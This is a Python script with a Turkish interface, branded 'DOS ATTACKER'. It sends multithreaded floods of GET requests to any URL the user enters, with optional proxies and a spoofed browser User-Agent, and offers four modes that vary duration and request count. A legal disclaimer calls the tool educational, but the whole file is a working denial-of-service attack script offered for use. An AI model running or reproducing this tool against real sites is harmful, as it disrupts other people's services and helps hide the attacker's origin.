import requests
import time
from colorama import Fore, init, Style
import threading


init(autoreset=True)

def proxy(proxy_url):
    try:
        proxies = {
            "http": proxy_url,
            "https": proxy_url
        }

        return proxies
    except Exception as e:
        print(Fore.LIGHTRED_EX + f"Proxy ayarlanırken hata oluştu: {e}")
        return None




def surekli_get():
    while True:

        print(Fore.LIGHTGREEN_EX + "---------------------------------------------------------------------")
        print(Fore.LIGHTGREEN_EX + "Saldırıyı durdurmak için 'CTR + C' tuşlarına basın.")
        print(Fore.LIGHTGREEN_EX + "---------------------------------------------------------------------")

        hedef = input(Fore.LIGHTYELLOW_EX + "hedef: ")

        if not (hedef.startswith("http://") or hedef.startswith("https://")):
            print(Fore.LIGHTRED_EX + "Lütfen geçerli bir URL girin! (http:// veya https:// ile başlamalı)")
            continue
        def thread_get(hedef, headers):
            while True:
                try:
                    r = requests.get(hedef, proxies=proxies, headers=headers)
                except requests.exceptions.MissingSchema:
                    print(Fore.LIGHTRED_EX + "Lütfen geçerli bir URL girin!")
                    continue
                except Exception as e:
                    print(Fore.LIGHTRED_EX + f"Bir hata oluştu: {e}")
                    break
                print(r.status_code)
                if r.status_code == 200:
                    print(Fore.GREEN + "Hedefe istek başarılı!")
                elif r.status_code == 404:
                    print(Fore.YELLOW + "Hedef bulunamadı!")
                    break
                elif r.status_code == 403:
                    print(Fore.RED + "Erişim reddedildi!")
                    break
                elif r.status_code == 500:
                    print(Fore.LIGHTRED_EX + "Sunucu hatası!")
                    break
                else:
                    print(Fore.LIGHTYELLOW_EX + "Bilinmeyen durum:", r.status_code)
                    break

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
        }

        try:
            thread_sayisi = int(input(Fore.LIGHTCYAN_EX + "Kaç thread ile saldırı yapmak istiyorsunuz?: "))
        except ValueError:
            print(Fore.LIGHTRED_EX + "Lütfen geçerli bir sayı girin!")
            continue

        if thread_sayisi <= 0:
            print(Fore.LIGHTRED_EX + "Thread sayısı 0'dan büyük olmalıdır!")
            continue

        proxy_url = input(Fore.LIGHTCYAN_EX + "Proxy URL (isteğe bağlı): ")

        if proxy_url:
            proxies = proxy(proxy_url)
            if not proxies:
                continue
        else:
            proxies = None

        if proxies:
            print(Fore.LIGHTYELLOW_EX + f"Proxy ayarlandı: {proxies}")
        else:
            print(Fore.LIGHTYELLOW_EX + "Proxy ayarlanmadı, doğrudan bağlantı kullanılacak.")

        print(Fore.LIGHTYELLOW_EX + f"{thread_sayisi} thread ile saldırı başlatılıyor...")
        time.sleep(2)

        threads = []

        for _ in range(thread_sayisi):
            t = threading.Thread(target=thread_get, args=(hedef, headers))
            t.daemon = True
            t.start()
            threads.append(t)
        



def sureli_get():
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }
    while True:

        print(Fore.LIGHTGREEN_EX + "--------------------------------------------------------------------")
        print(Fore.LIGHTGREEN_EX + "Saldırıyı durdurmak için 'CTR + C' tuşlarına basın.")
        print(Fore.LIGHTGREEN_EX + "---------------------------------------------------------------------")

        hedef = input(Fore.LIGHTYELLOW_EX + "hedef: ")

        try:
            sure = int(input(Fore.LIGHTCYAN_EX + "Süre (saniye cinsinden): "))
            thread_sayisi = int(input(Fore.LIGHTCYAN_EX + "Kaç thread ile saldırı yapmak istiyorsunuz?: "))
        except ValueError:
            print(Fore.LIGHTRED_EX + "Lütfen geçerli bir sayı girin!")
            continue

        if sure <= 0 or thread_sayisi <= 0:
            print(Fore.LIGHTRED_EX + "Süre ve thread sayısı 0'dan büyük olmalıdır!")
            continue

        proxy_url = input(Fore.LIGHTCYAN_EX + "Proxy URL (isteğe bağlı): ")

        if proxy_url:
            proxies = proxy(proxy_url)
            if not proxies:
                continue
        else:
            proxies = None

        if proxies:
            print(Fore.LIGHTYELLOW_EX + f"Proxy ayarlandı: {proxies}")
        else:
            print(Fore.LIGHTYELLOW_EX + "Proxy ayarlanmadı, doğrudan bağlantı kullanılacak.")

        print(Fore.LIGHTYELLOW_EX + f"{thread_sayisi} thread ile saldırı başlatılıyor...")
        time.sleep(2)

        if not (hedef.startswith("http://") or hedef.startswith("https://")):
            print(Fore.LIGHTRED_EX + "Lütfen geçerli bir URL girin! (http:// veya https:// ile başlamalı)")
            continue

        def thread_sureli_get(hedef, sure):
            while True:

                try:
                    r = requests.get(hedef, proxies=proxies, headers=headers)
                    time.sleep(sure)

                except requests.exceptions.MissingSchema:
                    print(Fore.LIGHTRED_EX + "Lütfen geçerli bir URL girin!")
                    continue

                except Exception as e:
                    print(Fore.LIGHTRED_EX + f"Bir hata oluştu: {e}")
                    break

                print(r.status_code)

                if r.status_code == 200:
                    print(Fore.GREEN + "Hedefe istek başarılı!")

                elif r.status_code == 404:
                    print(Fore.YELLOW + "Hedef bulunamadı!")
                    break

                elif r.status_code == 403:
                    print(Fore.RED + "Erişim reddedildi!")
                    break

                elif r.status_code == 500:
                    print(Fore.LIGHTRED_EX + "Sunucu hatası!")
                    break

                else:
                    print(Fore.LIGHTYELLOW_EX + "Bilinmeyen durum:", r.status_code)
                    break

        threads = []

        for _ in range(thread_sayisi):
            t = threading.Thread(target=thread_sureli_get, args=(hedef, sure))
            t.daemon = True
            t.start()
            threads.append(t)


def miktarli_sureli_get():
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }
    while True:

        print(Fore.LIGHTGREEN_EX + "--------------------------------------------------------------------")
        print(Fore.LIGHTGREEN_EX + "Saldırıyı durdurmak için 'CTR + C' tuşlarına basın.")
        print(Fore.LIGHTGREEN_EX + "---------------------------------------------------------------------")

        hedef = input(Fore.LIGHTYELLOW_EX + "hedef: ")

        try:
            miktar = int(input(Fore.LIGHTCYAN_EX + "miktar giriniz: "))
            sure = int(input(Fore.LIGHTCYAN_EX + "Süre (saniye cinsinden): "))
            thread_sayisi = int(input(Fore.LIGHTCYAN_EX + "Kaç thread ile saldırı yapmak istiyorsunuz?: "))
        except ValueError:
            print(Fore.LIGHTRED_EX + "Lütfen geçerli bir sayı girin!")
            continue

        if sure <= 0 or miktar <= 0 or thread_sayisi <= 0:
            print(Fore.LIGHTRED_EX + "Süre, miktar ve thread sayısı 0'dan büyük olmalıdır!")
            continue

        proxy_url = input(Fore.LIGHTCYAN_EX + "Proxy URL (isteğe bağlı): ")

        if proxy_url:
            proxies = proxy(proxy_url)
            if not proxies:
                continue
        else:
            proxies = None

        if proxies:
            print(Fore.LIGHTYELLOW_EX + f"Proxy ayarlandı: {proxies}")
        else:
            print(Fore.LIGHTYELLOW_EX + "Proxy ayarlanmadı, doğrudan bağlantı kullanılacak.")

        print(Fore.LIGHTYELLOW_EX + f"{thread_sayisi} thread ile saldırı başlatılıyor...")
        time.sleep(2)

        if not (hedef.startswith("http://") or hedef.startswith("https://")):
            print(Fore.LIGHTRED_EX + "Lütfen geçerli bir URL girin! (http:// veya https:// ile başlamalı)")
            continue

        def thread_miktarli_sureli_get(hedef, sure, miktar):
            for _ in range(miktar):

                try:
                    r = requests.get(hedef, proxies=proxies, headers=headers)
                    time.sleep(sure)

                except requests.exceptions.MissingSchema:
                    print(Fore.LIGHTRED_EX + "Lütfen geçerli bir URL girin!")
                    continue

                except Exception as e:
                    print(Fore.LIGHTRED_EX + f"Bir hata oluştu: {e}")
                    break

                print(r.status_code)

                if r.status_code == 200:
                    print(Fore.GREEN + "Hedefe istek başarılı!")

                elif r.status_code == 404:
                    print(Fore.YELLOW + "Hedef bulunamadı!")
                    break

                elif r.status_code == 403:
                    print(Fore.RED + "Erişim reddedildi!")
                    break

                elif r.status_code == 500:
                    print(Fore.LIGHTRED_EX + "Sunucu hatası!")
                    break

                else:
                    print(Fore.LIGHTYELLOW_EX + "Bilinmeyen durum:", r.status_code)
                    break

        threads = []

        for _ in range(thread_sayisi):
            t = threading.Thread(target=thread_miktarli_sureli_get, args=(hedef, sure, miktar))
            t.daemon = True
            t.start()
            threads.append(t)
        


def miktarli_suresiz_get():
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }
    while True:

        print(Fore.LIGHTGREEN_EX + "--------------------------------------------------------------------")
        print(Fore.LIGHTGREEN_EX + "Saldırıyı durdurmak için 'CTR + C' tuşlarına basın.")
        print(Fore.LIGHTGREEN_EX + "---------------------------------------------------------------------")

        hedef = input(Fore.LIGHTYELLOW_EX + "hedef: ")

        try:
            miktar = int(input(Fore.LIGHTCYAN_EX + "miktar giriniz: "))
            thread_sayisi = int(input(Fore.LIGHTCYAN_EX + "Kaç thread ile saldırı yapmak istiyorsunuz?: "))
        except ValueError:
            print(Fore.LIGHTRED_EX + "Lütfen geçerli bir sayı girin!")
            continue

        if miktar <= 0 or thread_sayisi <= 0:
            print(Fore.LIGHTRED_EX + "Miktar ve thread sayısı 0'dan büyük olmalıdır!")
            continue

        proxy_url = input(Fore.LIGHTCYAN_EX + "Proxy URL (isteğe bağlı): ")

        if proxy_url:
            proxies = proxy(proxy_url)
            if not proxies:
                continue
        else:
            proxies = None

        if proxies:
            print(Fore.LIGHTYELLOW_EX + f"Proxy ayarlandı: {proxies}")
        else:
            print(Fore.LIGHTYELLOW_EX + "Proxy ayarlanmadı, doğrudan bağlantı kullanılacak.")

        print(Fore.LIGHTYELLOW_EX + f"{thread_sayisi} thread ile saldırı başlatılıyor...")
        time.sleep(2)

        if not (hedef.startswith("http://") or hedef.startswith("https://")):
            print(Fore.LIGHTRED_EX + "Lütfen geçerli bir URL girin! (http:// veya https:// ile başlamalı)")
            continue

        def thread_miktarli_suresiz_get(hedef, miktar):
            for _ in range(miktar):

                try:
                    r = requests.get(hedef, proxies=proxies, headers=headers)

                except requests.exceptions.MissingSchema:
                    print(Fore.LIGHTRED_EX + "Lütfen geçerli bir URL girin!")
                    continue

                except Exception as e:
                    print(Fore.LIGHTRED_EX + f"Bir hata oluştu: {e}")
                    break

                print(r.status_code)

                if r.status_code == 200:
                    print(Fore.GREEN + "Hedefe istek başarılı!")

                elif r.status_code == 404:
                    print(Fore.YELLOW + "Hedef bulunamadı!")
                    break

                elif r.status_code == 403:
                    print(Fore.RED + "Erişim reddedildi!")
                    break

                elif r.status_code == 500:
                    print(Fore.LIGHTRED_EX + "Sunucu hatası!")
                    break

                else:
                    print(Fore.LIGHTYELLOW_EX + "Bilinmeyen durum:", r.status_code)
                    break

        threads = []

        for _ in range(thread_sayisi):
            t = threading.Thread(target=thread_miktarli_suresiz_get, args=(hedef, miktar))
            t.daemon = True
            t.start()
            threads.append(t)



def yasal_uyari():
    print(Fore.RED + """
────────────────────────────────────────────────────
⚠️  YASAL UYARI – LEGAL DISCLAIMER  ⚠️

Bu araç yalnızca eğitim, test ve etik siber güvenlik 
amaçlı geliştirilmiştir.

✔️ Bu aracı sadece kendi sistemlerinizde veya 
   açıkça izin verilmiş hedeflerde kullanmalısınız.

❌ İzin alınmadan yapılan testler,
   Türk Ceza Kanunu'nun 243. ve 244. maddeleri uyarınca
   SUÇ teşkil eder.

Geliştirici hiçbir yasa dışı kullanımdan sorumlu tutulamaz.

Aracı kullanarak bu şartları kabul etmiş olursunuz.
────────────────────────────────────────────────────
""")
    print(Fore.RESET + Style.RESET_ALL + "geri dönülüyor...")
    time.sleep(3)
    







def logo():
        print(Fore.LIGHTYELLOW_EX + """
    <><><><><><><><><><><><><><><><><><><>
    |   D   O   S     A T T A C K E R   |
    <><><><><><><><><><><><><><><><><><><>
    \\___/ \\___/ \\___/ \\___/ \\___/ \\___/
    """)
        
        print(Fore.LIGHTYELLOW_EX + "-Dos Attacker hedefe sürekli get isteği göndererek sisteme yük bindirir.")

        print(Fore.LIGHTYELLOW_EX + "--------------------------------------------------------------------------------------------------------------")

        print(Fore.LIGHTYELLOW_EX + "--Hedef URL'yi girerken 'http://' veya 'https://' ile başladığından emin olun. Örnek: https://example.com")

        print(Fore.LIGHTYELLOW_EX + "---------------------------------------------------------------------------------------------------------------")






while True:
    logo()
    print(Fore.LIGHTYELLOW_EX + "1. Süresiz GET İsteği Gönder")
    print(Fore.LIGHTYELLOW_EX + "2. Süreli GET İsteği Gönder")
    print(Fore.LIGHTYELLOW_EX + "3. Miktarlı Süreli GET İsteği Gönder")
    print(Fore.LIGHTYELLOW_EX + "4. Miktarlı Süresiz GET İsteği Gönder")
    print(Fore.LIGHTYELLOW_EX + "5. Yasal Uyarı")
    print(Fore.LIGHTYELLOW_EX + "6. Çıkış")
    secim = input(Fore.YELLOW + "Seçiminizi yapın (1/2/3/4/5/6)\n ==> ")
    if secim == "1":
        surekli_get()
    elif secim == "2":          
        sureli_get()
    elif secim == "3":
        miktarli_sureli_get()
    elif secim == "4":
        miktarli_suresiz_get()
    elif secim == "5":
        yasal_uyari()
    elif secim == "6":
        print(Fore.LIGHTYELLOW_EX + "Çıkılıyor...")
        time.sleep(2)
        break
    else:
        print(Fore.RED + "----------------------------------------------------------------------")
        print(Fore.RED + "Geçersiz seçim! Lütfen 1, 2 veya 3 girin.")
        print(Fore.RED + "---------------------------------------------------------------------")
        time.sleep(2)
        
        continue